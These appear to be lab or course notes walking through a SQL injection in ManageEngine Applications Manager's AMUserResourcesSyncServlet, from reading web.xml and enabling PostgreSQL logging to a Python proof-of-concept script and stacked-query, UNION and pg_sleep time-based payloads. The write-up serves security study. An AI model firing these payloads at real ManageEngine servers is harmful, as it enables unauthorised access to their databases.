# ManageEngine
## Servlet Mappings
The `.do` extension is typically a URL mapping scheme for compiled Java code.

Fortunately, there is only one Java process running on our vulnerable machine. Some applications use multiple Java process instances though. In such cases, we can check any given process properties in **Process Explorer** by right-clicking on the process name and choosing **Properties**

In the **Path** location, we can see that the process uses a working directory of **C:\Program Files\ManageEngine\AppManager12\working\\**.

Java web applications use a deployment descriptor file named **web.xml** to determine how URLs map to servlets, which URLs require authentication, and other information.

Within the working directory, we see a **WEB-INF** folder, which is the Java's default configuration folder path where we can find the web.xml file. This file contains a number of servlet names to servlet classes as well as the servlet name to URL mappings.

By checking the contents of the **C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\lib** directory, we notice that it contains a number of **JAR** files. If we just take a look at the names of these files, we can see that most of them are actually standard third party libraries such as **struts.jar** or **xmlsec-1.3.0.jar**. Only four JAR files in this directory appear to be native to ManageEngine.

Most query strings are assigned to a variable named query:
```java
String query = "select count(*) from Alert where SEVERITY = " + i + " and groupname = 'AppManager'";
```

Specifically, it contains a couple of key strings we want to look for, namely "query" and "select", and also uses string concatenation using the "+" operator.

```regexp
^.*?query.*?select.*?
```

* Look for any line that contains any number of alphanumeric characters at the beginning.
* Which is followed by the string **QUERY**
* Which is followed by any number of alphanumeric characters
* Which is followed by the string **SELECT**
* Which is followed by any number of alphanumeric characters

HTTP request handler functions
* doGet
* doPost
* doPut
* doDelete
* doCopy
* doOptions

```java
protected void doGet(HttpServletRequest req, HttpServletResponse resp)
```

The first parameter is an **HttpServletRequest** object that contains the request a client has made to the web application, and the second one is an **HttpServletResponse** object that contains a response the servlet will send to the client after the request is processed.

We are interested in the servlet code that extracts HTTP request parameters through the **getParameter** or **getParameterValues** methods.

```java
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;

rs = AMConnectionPool.executeQueryStmt(qry);
```

## Enable Database Logging
Since ManageEngine uses PostgreSQL as a back end database, we will need to edit its configuration file in order to enable any logging feature. In our virtual machine, the **postgresql.conf** file is located at the following path: **C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\postgresql.conf**

In order to instruct the database to log all SQL queries we'll change the postgresql.conf log_statement setting to 'all' as shown in the listing below.

```
log_statement = 'all'			# none, ddl, mod, all
```

After changing the log file, we will need to restart the ManageEngine Applications Manager service to apply the new settings. We can do this by launching services.msc and finding the ManageEngine Applications Manager service.

Once the service is restarted, we will be able to see failed queries in log files, beginning with swissql, in the following directory:
**C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\\**

To execute SQL queries directly against the database for debugging purposes. 
* **pgAdmin** software, which is installed on the ManageEngine virtual machine.
* command line utility **psql.exe**, you can use that as well. Please note that the ManageEngine server instance is configured to listen on port 15432.

```bat
psql.exe -U postgres -p 15432
```

## Triggering the Vulnerability
From the servlet mapping initially discovered in the web.xml file, we know that the URL we need to use to reach the vulnerable code is as follows:
```xml
<servlet-mapping>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <url-pattern>/servlet/AMUserResourcesSyncServlet</url-pattern>
</servlet-mapping>
```

```xml
<servlet>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <servlet-class>com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet</servlet-class>
</servlet>
```

```http
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1
Host: manageengine:8443
```

```python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print "(+) usage %s <target>" % sys.argv[0]
        print "(+) eg: %s target" % sys.argv[0]
        sys.exit(1)
    
    t = sys.argv[1]
    
    sqli = ";"

    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, params='ForMasRange=1&userId=1%s' % sqli, verify=False)
    print r.text
    print r.headers

if __name__ == '__main__':
    main()
```

To use a UNION query and extract data directly from the database. However, the RESOURCEID column that the original query is referencing, is defined as a BIGINT datatype, i.e., we could only extract arbitrary data when it is of the same data type.
```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 1
```

To use a UNION query with a boolean-based blind injection. We could construct the injected queries to ask a series of TRUE and FALSE questions and infer the data we are trying to extract in that fashion.
```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
```
The reason why we are not considering this approach is because Postgres SQL-injection attacks allow an attacker to perform stacked queries. This means that we can use a query terminator character in our payload, and inject a completely new query into the original vulnerable query string. The downside with stacked queries is that they return multiple result sets. This can break the logic of the application and with it the ability to exfiltrate data with a boolean blind-based attack. Unfortunately, this is exactly what happens with our ManageEngine application. 


To solve this problem and still be able to use the flexibility of stacked queries, we have to resort to time-based blind injection payloads. resort to time-based blind injection payloads.
In the case of PostgreSQL, to confirm the blind injection we would use the **pg_sleep** function

```http
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
select+pg_sleep(10); HTTP/1.1
Host: manageengine:8443
```